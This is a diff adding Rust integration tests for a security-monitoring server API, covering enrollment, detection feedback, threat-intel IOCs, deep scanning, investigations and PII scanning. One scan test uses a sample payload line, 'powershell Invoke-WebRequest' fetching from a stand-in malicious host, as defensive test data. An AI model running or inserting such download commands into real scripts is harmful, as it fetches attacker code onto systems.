@@ -33,6 +33,29 @@ fn test_state_path(port: u16, file_name: &str) -> String {
     test_state_root(port).join(file_name).display().to_string()
 }
 
+fn enroll_test_agent(port: u16, token: &str, hostname: &str) -> String {
+    let resp = ureq::post(&format!("{}/api/agents/token", base(port)))
+        .set("Authorization", &auth_header(token))
+        .set("Content-Type", "application/json")
+        .send_string(r#"{"max_uses":1}"#)
+        .expect("create enrollment token");
+    let tok: serde_json::Value = resp.into_json().unwrap();
+    let enrollment_token = tok["token"].as_str().unwrap();
+
+    let body = serde_json::json!({
+        "enrollment_token": enrollment_token,
+        "hostname": hostname,
+        "platform": "linux",
+        "version": "0.15.0",
+    });
+    let resp = ureq::post(&format!("{}/api/agents/enroll", base(port)))
+        .set("Content-Type", "application/json")
+        .send_string(&body.to_string())
+        .expect("enroll agent");
+    let enroll: serde_json::Value = resp.into_json().unwrap();
+    enroll["agent_id"].as_str().unwrap().to_string()
+}
+
 // ── GET /api/status ────────────────────────────────────────────
 
 #[test]
@@ -74,6 +97,173 @@ fn report_returns_200_with_summary_and_samples() {
     let samples = body["samples"].as_array().unwrap();
     // Fresh server with no alerts returns an empty or populated live sample list without error.
     let _ = samples.len();
+}
+
+#[test]
+fn onboarding_readiness_and_manager_queue_digest_return_structured_payloads() {
+    let (port, token) = spawn_test_server();
+    let auth = auth_header(&token);
+
+    let readiness = ureq::get(&format!("{}/api/onboarding/readiness", base(port)))
+        .set("Authorization", &auth)
+        .call()
+        .expect("onboarding readiness");
+    assert_eq!(readiness.status(), 200);
+    let readiness_body: serde_json::Value = readiness.into_json().unwrap();
+    assert!(readiness_body["total"].as_u64().unwrap() >= 7);
+    assert!(readiness_body["checks"].as_array().unwrap().len() >= 7);
+
+    let digest = ureq::get(&format!("{}/api/manager/queue-digest", base(port)))
+        .set("Authorization", &auth)
+        .call()
+        .expect("manager queue digest");
+    assert_eq!(digest.status(), 200);
+    let digest_body: serde_json::Value = digest.into_json().unwrap();
+    assert!(digest_body.get("queue").is_some());
+    assert!(digest_body.get("changes_since_last_shift").is_some());
+}
+
+#[test]
+fn detection_feedback_roundtrip_and_explainability_include_feedback() {
+    let (port, token) = spawn_test_server();
+    let auth = auth_header(&token);
+    let agent_id = enroll_test_agent(port, &token, "feedback-agent");
+
+    let batch = serde_json::json!({
+        "agent_id": agent_id,
+        "events": [{
+            "timestamp": "2026-04-22T10:00:00Z",
+            "hostname": "feedback-agent",
+            "platform": "linux",
+            "score": 8.4,
+            "confidence": 0.93,
+            "level": "Critical",
+            "action": "credential_access",
+            "reasons": ["credential_dump_attempt", "lsass_access"],
+            "sample": {
+                "timestamp_ms": 0, "cpu_load_pct": 40.0, "memory_load_pct": 50.0,
+                "temperature_c": 60.0, "network_kbps": 100.0, "auth_failures": 3,
+                "battery_pct": 80.0, "integrity_drift": 0.1,
+                "process_count": 50, "disk_pressure_pct": 10.0
+            },
+            "enforced": false
+        }]
+    });
+    ureq::post(&format!("{}/api/events", base(port)))
+        .set("Content-Type", "application/json")
+        .send_string(&batch.to_string())
+        .expect("ingest event");
+
+    let feedback = ureq::post(&format!("{}/api/detection/feedback", base(port)))
+        .set("Authorization", &auth)
+        .set("Content-Type", "application/json")
+        .send_string(
+            &serde_json::json!({
+                "event_id": 1,
+                "analyst": "alice",
+                "verdict": "true_positive",
+                "reason_pattern": "credential_dump_attempt, lsass_access",
+                "notes": "validated with host context",
+                "evidence": [{
+                    "kind": "reason",
+                    "label": "Rule",
+                    "value": "credential_dump_attempt",
+                    "confidence": 0.93,
+                    "source": "detector"
+                }]
+            })
+            .to_string(),
+        )
+        .expect("record feedback");
+    assert_eq!(feedback.status(), 200);
+
+    let listed = ureq::get(&format!("{}/api/detection/feedback?event_id=1", base(port)))
+        .set("Authorization", &auth)
+        .call()
+        .expect("list feedback");
+    let listed_body: serde_json::Value = listed.into_json().unwrap();
+    assert_eq!(listed_body["summary"]["total"].as_u64().unwrap(), 1);
+    assert_eq!(listed_body["items"][0]["analyst"].as_str().unwrap(), "alice");
+
+    let explain = ureq::get(&format!("{}/api/detection/explain?event_id=1", base(port)))
+        .set("Authorization", &auth)
+        .call()
+        .expect("detection explain");
+    assert_eq!(explain.status(), 200);
+    let explain_body: serde_json::Value = explain.into_json().unwrap();
+    assert!(explain_body["why_fired"].as_array().unwrap().len() >= 1);
+    assert_eq!(explain_body["feedback"].as_array().unwrap().len(), 1);
+}
+
+#[test]
+fn deep_scan_v2_and_threat_intel_v2_expose_profiles_and_sightings() {
+    use base64::Engine as _;
+    use sha2::{Digest, Sha256};
+
+    let (port, token) = spawn_test_server();
+    let auth = auth_header(&token);
+    let data = b"powershell Invoke-WebRequest https://malicious.example/payload";
+    let sha256 = {
+        let mut hasher = Sha256::new();
+        hasher.update(data);
+        hex::encode(hasher.finalize())
+    };
+
+    ureq::post(&format!("{}/api/threat-intel/ioc", base(port)))
+        .set("Authorization", &auth)
+        .set("Content-Type", "application/json")
+        .send_string(
+            &serde_json::json!({
+                "ioc_type": "hash",
+                "value": sha256,
+                "confidence": 0.91
+            })
+            .to_string(),
+        )
+        .expect("add threat intel ioc");
+
+    let scan = ureq::post(&format!("{}/api/scan/buffer/v2", base(port)))
+        .set("Authorization", &auth)
+        .set("Content-Type", "application/json")
+        .send_string(
+            &serde_json::json!({
+                "filename": "suspicious.ps1",
+                "data": base64::engine::general_purpose::STANDARD.encode(data),
+                "behavior": {
+                    "suspicious_process_tree": true,
+                    "defense_evasion": false,
+                    "persistence_installed": true,
+                    "c2_beaconing_detected": true,
+                    "credential_access": false
+                },
+                "allowlist": {
+                    "trusted_publishers": ["microsoft"],
+                    "internal_tools": ["internal-updater"]
+                }
+            })
+            .to_string(),
+        )
+        .expect("deep scan v2");
+    assert_eq!(scan.status(), 200);
+    let scan_body: serde_json::Value = scan.into_json().unwrap();
+    assert!(scan_body.get("static_profile").is_some());
+    assert!(scan_body.get("behavior_profile").is_some());
+    assert!(scan_body["scan"]["matches"].as_array().unwrap().len() >= 1);
+
+    let library = ureq::get(&format!("{}/api/threat-intel/library/v2", base(port)))
+        .set("Authorization", &auth)
+        .call()
+        .expect("threat intel library v2");
+    let library_body: serde_json::Value = library.into_json().unwrap();
+    assert!(library_body.get("indicators").is_some());
+    assert!(library_body.get("recent_sightings").is_some());
+
+    let sightings = ureq::get(&format!("{}/api/threat-intel/sightings?limit=10", base(port)))
+        .set("Authorization", &auth)
+        .call()
+        .expect("threat intel sightings");
+    let sightings_body: serde_json::Value = sightings.into_json().unwrap();
+    assert!(sightings_body["count"].as_u64().unwrap() >= 1);
 }
 
 // ── POST /api/analyze — auth required ──────────────────────────
@@ -619,6 +809,8 @@ fn enforcement_status_returns_enforcer_info() {
     let body: serde_json::Value = resp.into_json().unwrap();
     assert!(body.get("process_enforcer").is_some());
     assert!(body.get("tpm").is_some());
+    assert!(body.get("history_len").is_some());
+    assert!(body["recent_history"].as_array().is_some());
 }
 
 // ── POST /api/enforcement/quarantine ───────────────────────────
@@ -634,6 +826,7 @@ fn enforcement_quarantine_returns_results() {
     let body: serde_json::Value = resp.into_json().unwrap();
     assert_eq!(body["target"], "192.168.1.100");
     assert!(body.get("actions").is_some());
+    assert!(body["results"].as_array().is_some());
 }
 
 #[test]
@@ -659,6 +852,31 @@ fn threat_intel_status_returns_ioc_count() {
     assert_eq!(resp.status(), 200);
     let body: serde_json::Value = resp.into_json().unwrap();
     assert!(body.get("ioc_count").is_some());
+}
+
+#[test]
+fn threat_intel_library_returns_added_iocs() {
+    let (port, token) = spawn_test_server();
+    let add_resp = ureq::post(&format!("{}/api/threat-intel/ioc", base(port)))
+        .set("Authorization", &auth_header(&token))
+        .send_json(serde_json::json!({"value": "evil.example", "ioc_type": "domain", "confidence": 0.91}))
+        .expect("add threat intel ioc");
+    assert_eq!(add_resp.status(), 200);
+
+    let resp = ureq::get(&format!("{}/api/threat-intel/library", base(port)))
+        .set("Authorization", &auth_header(&token))
+        .call()
+        .expect("threat intel library");
+    assert_eq!(resp.status(), 200);
+    let body: serde_json::Value = resp.into_json().unwrap();
+    let iocs = body["iocs"].as_array().expect("ioc array");
+    assert!(body["count"].as_u64().unwrap_or_default() >= 1);
+    assert!(iocs.iter().any(|ioc| ioc["value"] == "evil.example"));
+    assert!(body.get("feeds").and_then(|value| value.as_array()).is_some());
+    assert!(body
+        .get("recent_matches")
+        .and_then(|value| value.as_array())
+        .is_some());
 }
 
 // ── POST /api/threat-intel/ioc ─────────────────────────────────
@@ -699,6 +917,7 @@ fn digital_twin_status_returns_twin_count() {
     assert_eq!(resp.status(), 200);
     let body: serde_json::Value = resp.into_json().unwrap();
     assert!(body.get("twin_count").is_some());
+    assert!(body["devices"].as_array().is_some());
 }
 
 // ── POST /api/digital-twin/simulate ────────────────────────────
@@ -713,7 +932,12 @@ fn digital_twin_simulate_returns_result() {
     assert_eq!(resp.status(), 200);
     let body: serde_json::Value = resp.into_json().unwrap();
     assert_eq!(body["device_id"], "twin-1");
+    assert_eq!(body["event_type"], "cpu_spike");
     assert!(body.get("ticks_simulated").is_some());
+    assert!(body.get("seeded_device").is_some());
+    assert!(body.get("final_state").is_some());
+    assert!(body["alerts_generated"].as_array().is_some());
+    assert!(body["state_transitions"].as_array().is_some());
 }
 
 #[test]
@@ -959,13 +1183,23 @@ fn harness_run_returns_evasion_metrics() {
     let (port, token) = spawn_test_server();
     let resp = ureq::post(&format!("{}/api/harness/run", base(port)))
         .set("Authorization", &auth_header(&token))
-        .send_string("")
+        .send_json(serde_json::json!({
+            "traces_per_strategy": 4,
+            "trace_length": 60,
+            "evasion_threshold": 1.25
+        }))
         .expect("harness run");
     assert_eq!(resp.status(), 200);
     let body: serde_json::Value = resp.into_json().unwrap();
     assert!(body.get("evasion_rate").is_some());
     assert!(body.get("coverage_ratio").is_some());
     assert!(body.get("total_count").is_some());
+    assert_eq!(body["config"]["traces_per_strategy"], 4);
+    assert_eq!(body["config"]["trace_length"], 60);
+    assert_eq!(body["config"]["evasion_threshold"], 1.25);
+    assert!(body["score_buckets"].as_array().is_some());
+    assert!(body["strategies"].as_array().is_some());
+    assert!(body.get("transition_count").is_some());
 }
 
 #[test]
@@ -1021,6 +1255,8 @@ fn deception_status_returns_report() {
     let body: serde_json::Value = resp.into_json().unwrap();
     assert!(body.get("total_decoys").is_some());
     assert!(body.get("active_decoys").is_some());
+    assert!(body["attacker_profiles"].as_array().is_some());
+    assert!(body["decoys"].as_array().is_some());
 }
 
 // ── POST /api/deception/deploy ─────────────────────────────────
@@ -1640,6 +1876,10 @@ fn endpoints_returns_array() {
     );
     assert!(
         arr.iter()
+            .any(|entry| entry["path"] == "/api/threat-intel/library" && entry["auth"] == true)
+    );
+    assert!(
+        arr.iter()
             .any(|entry| entry["path"] == "/api/playbooks" && entry["auth"] == true)
     );
     assert!(
@@ -1852,6 +2092,7 @@ fn viewer_and_analyst_roles_can_access_operator_read_flows() {
         "/api/playbooks",
         "/api/updates/releases",
         "/api/threat-intel/status",
+        "/api/threat-intel/library",
         "/api/timeline/host?hostname=viewer-ops-host",
     ] {
         let viewer_resp = ureq::get(&format!("{}{}", base(port), path))
@@ -3039,6 +3280,153 @@ fn timeline_endpoints_support_query_string_routing() {
     .unwrap();
     assert_eq!(agent_timeline["agent_id"].as_str().unwrap(), agent_id);
     assert_eq!(agent_timeline["count"].as_u64().unwrap(), 2);
+}
+
+#[test]
+fn investigation_progress_endpoint_updates_active_snapshot() {
+    let (port, token) = spawn_test_server();
+
+    let started: serde_json::Value = ureq::post(&format!("{}/api/investigations/start", base(port)))
+        .set("Authorization", &auth_header(&token))
+        .send_json(serde_json::json!({
+            "workflow_id": "credential-storm",
+            "analyst": "analyst-1"
+        }))
+        .expect("start investigation")
+        .into_json()
+        .unwrap();
+
+    let investigation_id = started["id"].as_str().expect("investigation id");
+    assert!(investigation_id.starts_with("inv-"));
+    assert_eq!(started["workflow_id"].as_str(), Some("credential-storm"));
+    assert_eq!(started["status"].as_str(), Some("in-progress"));
+
+    let updated: serde_json::Value =
+        ureq::post(&format!("{}/api/investigations/progress", base(port)))
+            .set("Authorization", &auth_header(&token))
+            .send_json(serde_json::json!({
+                "investigation_id": investigation_id,
+                "step": 1,
+                "completed": true,
+                "note": "VPN telemetry reviewed",
+                "finding": "Lockout pattern confirmed from single ASN"
+            }))
+            .expect("update investigation progress")
+            .into_json()
+            .unwrap();
+
+    assert_eq!(updated["id"].as_str(), Some(investigation_id));
+    assert_eq!(updated["notes"]["1"].as_str(), Some("VPN telemetry reviewed"));
+    assert!(updated["completed_steps"]
+        .as_array()
+        .map(|items| items.iter().any(|value| value.as_u64() == Some(1)))
+        .unwrap_or(false));
+    assert!(updated["findings"]
+        .as_array()
+        .map(|items| {
+            items.iter().any(|value| {
+                value.as_str() == Some("Lockout pattern confirmed from single ASN")
+            })
+        })
+        .unwrap_or(false));
+    assert!(updated["completion_percent"].as_u64().unwrap_or_default() > 0);
+    assert_eq!(updated["next_step"]["order"].as_u64(), Some(2));
+
+    let active: serde_json::Value = ureq::get(&format!("{}/api/investigations/active", base(port)))
+        .set("Authorization", &auth_header(&token))
+        .call()
+        .expect("active investigations")
+        .into_json()
+        .unwrap();
+
+    let active_items = active.as_array().expect("active investigation array");
+    let snapshot = active_items
+        .iter()
+        .find(|entry| entry["id"].as_str() == Some(investigation_id))
+        .expect("active snapshot present");
+    assert_eq!(snapshot["notes"]["1"].as_str(), Some("VPN telemetry reviewed"));
+    assert_eq!(snapshot["workflow_name"].as_str(), Some("Investigate Credential Storm"));
+}
+
+#[test]
+fn investigation_handoff_updates_linked_case_assignment_and_commentary() {
+    let (port, token) = spawn_test_server();
+
+    let case: serde_json::Value = ureq::post(&format!("{}/api/cases", base(port)))
+        .set("Authorization", &auth_header(&token))
+        .send_json(serde_json::json!({
+            "title": "Identity escalation case",
+            "priority": "high",
+            "description": "Tracks credential storm investigation",
+            "tags": ["identity", "handoff"]
+        }))
+        .expect("create case")
+        .into_json()
+        .unwrap();
+    let case_id = case["id"].as_u64().expect("case id");
+
+    let started: serde_json::Value = ureq::post(&format!("{}/api/investigations/start", base(port)))
+        .set("Authorization", &auth_header(&token))
+        .send_json(serde_json::json!({
+            "workflow_id": "credential-storm",
+            "analyst": "analyst-1",
+            "case_id": case_id.to_string()
+        }))
+        .expect("start investigation")
+        .into_json()
+        .unwrap();
+
+    let investigation_id = started["id"].as_str().expect("investigation id");
+    let handed_off: serde_json::Value =
+        ureq::post(&format!("{}/api/investigations/handoff", base(port)))
+            .set("Authorization", &auth_header(&token))
+            .send_json(serde_json::json!({
+                "investigation_id": investigation_id,
+                "to_analyst": "analyst-2",
+                "summary": "Containment is in place but MFA bypass scope still needs confirmation.",
+                "next_actions": [
+                    "Confirm all targeted accounts were reset",
+                    "Validate VPN source IP blocks"
+                ],
+                "questions": [
+                    "Was any successful login followed by privilege escalation?"
+                ],
+                "case_id": case_id.to_string()
+            }))
+            .expect("handoff investigation")
+            .into_json()
+            .unwrap();
+
+    assert_eq!(handed_off["status"].as_str(), Some("handoff-ready"));
+    assert_eq!(handed_off["analyst"].as_str(), Some("analyst-2"));
+    assert_eq!(handed_off["handoff"]["from_analyst"].as_str(), Some("analyst-1"));
+    assert_eq!(handed_off["handoff"]["to_analyst"].as_str(), Some("analyst-2"));
+    assert!(handed_off["handoff"]["next_actions"]
+        .as_array()
+        .map(|items| {
+            items.iter()
+                .any(|value| value.as_str() == Some("Confirm all targeted accounts were reset"))
+        })
+        .unwrap_or(false));
+
+    let detail: serde_json::Value = ureq::get(&format!("{}/api/cases/{}", base(port), case_id))
+        .set("Authorization", &auth_header(&token))
+        .call()
+        .expect("case detail")
+        .into_json()
+        .unwrap();
+
+    assert_eq!(detail["assignee"].as_str(), Some("analyst-2"));
+    let comments = detail["comments"].as_array().expect("case comments");
+    assert!(comments.iter().any(|entry| {
+        entry["text"]
+            .as_str()
+            .map(|text| {
+                text.contains("Investigation handoff from analyst-1 to analyst-2")
+                    && text.contains("Validate VPN source IP blocks")
+            })
+            .unwrap_or(false)
+    }));
 }
 
 #[test]
@@ -4437,6 +4825,8 @@ fn enterprise_governance_and_support_endpoints_enforce_roles() {
             "display_name": "Okta Workforce",
             "issuer_url": "https://id.example.test",
             "client_id": "client-123",
+            "client_secret": "super-secret",
+            "redirect_uri": format!("{}/api/auth/sso/callback", base(port)),
             "enabled": true,
             "group_role_mappings": {
                 "soc-admins": "admin",
@@ -4647,12 +5037,20 @@ fn openapi_endpoint_returns_live_json_spec() {
     assert!(paths.contains_key("/api/config/current"));
     assert!(paths.contains_key("/api/openapi.json"));
     assert!(paths.contains_key("/api/threat-intel/status"));
+    assert!(paths.contains_key("/api/threat-intel/library"));
     assert!(paths.contains_key("/api/threat-intel/ioc"));
     assert!(paths.contains_key("/api/playbooks"));
     assert!(paths.contains_key("/api/fleet/dashboard"));
     assert!(paths.contains_key("/api/events/search"));
     assert!(paths.contains_key("/api/queue/stats"));
     assert!(paths.contains_key("/api/rollout/config"));
+    assert!(paths.contains_key("/api/investigations/workflows"));
+    assert!(paths.contains_key("/api/investigations/workflows/{id}"));
+    assert!(paths.contains_key("/api/investigations/start"));
+    assert!(paths.contains_key("/api/investigations/active"));
+    assert!(paths.contains_key("/api/investigations/progress"));
+    assert!(paths.contains_key("/api/investigations/handoff"));
+    assert!(paths.contains_key("/api/investigations/suggest"));
 
     let metrics = &paths["/api/metrics"]["get"]["responses"]["200"]["content"];
     assert!(metrics.get("text/plain").is_some());
@@ -4696,6 +5094,10 @@ fn openapi_endpoint_returns_live_json_spec() {
     assert!(report_html_params.iter().any(|param| {
         param["in"].as_str() == Some("path") && param["name"].as_str() == Some("id")
     }));
+
+    assert!(paths["/api/investigations/start"]["post"]["requestBody"].is_object());
+    assert!(paths["/api/investigations/progress"]["post"]["requestBody"].is_object());
+    assert!(paths["/api/investigations/handoff"]["post"]["requestBody"].is_object());
 
     for path in [
         "/api/cases",
@@ -4951,6 +5353,12 @@ fn export_alerts_json_format() {
         .call()
         .expect("export alerts json");
     assert_eq!(resp.status(), 200);
+    assert!(resp
+        .header("Content-Type")
+        .unwrap_or_default()
+        .contains("application/json"));
+    let body: serde_json::Value = resp.into_json().expect("json export payload");
+    assert!(body.is_array());
 }
 
 #[test]
@@ -4961,6 +5369,11 @@ fn export_alerts_cef_format() {
         .call()
         .expect("export alerts cef");
     assert_eq!(resp.status(), 200);
+    assert!(resp
+        .header("Content-Type")
+        .unwrap_or_default()
+        .contains("text/plain"));
+    let _body = resp.into_string().expect("cef export payload");
 }
 
 #[test]
@@ -5033,6 +5446,44 @@ fn export_alerts_unsupported_format_returns_400() {
         Err(ureq::Error::Status(400, _)) => {}
         other => panic!("expected 400 for unsupported format, got {other:?}"),
     }
+}
+
+#[test]
+fn gdpr_forget_returns_receipt() {
+    let (port, token) = spawn_test_server();
+    let resp = ureq::delete(&format!("{}/api/gdpr/forget/test-user-42", base(port)))
+        .set("Authorization", &auth_header(&token))
+        .call()
+        .expect("gdpr forget");
+    assert_eq!(resp.status(), 200);
+    let body: serde_json::Value = resp.into_json().expect("gdpr forget payload");
+    assert_eq!(body.get("status").and_then(|value| value.as_str()), Some("completed"));
+    assert_eq!(
+        body.get("entity_id").and_then(|value| value.as_str()),
+        Some("test-user-42")
+    );
+    assert!(body.get("records_purged").is_some());
+    assert!(body.get("timestamp").is_some());
+}
+
+#[test]
+fn pii_scan_returns_detected_categories() {
+    let (port, token) = spawn_test_server();
+    let resp = ureq::post(&format!("{}/api/pii/scan", base(port)))
+        .set("Authorization", &auth_header(&token))
+        .send_string("alice@example.com connected from 203.0.113.42 with 4111111111111111")
+        .expect("pii scan");
+    assert_eq!(resp.status(), 200);
+    let body: serde_json::Value = resp.into_json().expect("pii scan payload");
+    assert_eq!(body.get("has_pii").and_then(|value| value.as_bool()), Some(true));
+    let categories = body
+        .get("categories")
+        .and_then(|value| value.as_array())
+        .cloned()
+        .unwrap_or_default();
+    assert!(categories.iter().any(|value| value.as_str() == Some("email")));
+    assert!(categories.iter().any(|value| value.as_str() == Some("ip_address")));
+    assert!(categories.iter().any(|value| value.as_str() == Some("credit_card")));
 }
 
 // ── Compliance reports ─────────────────────────────────────────────
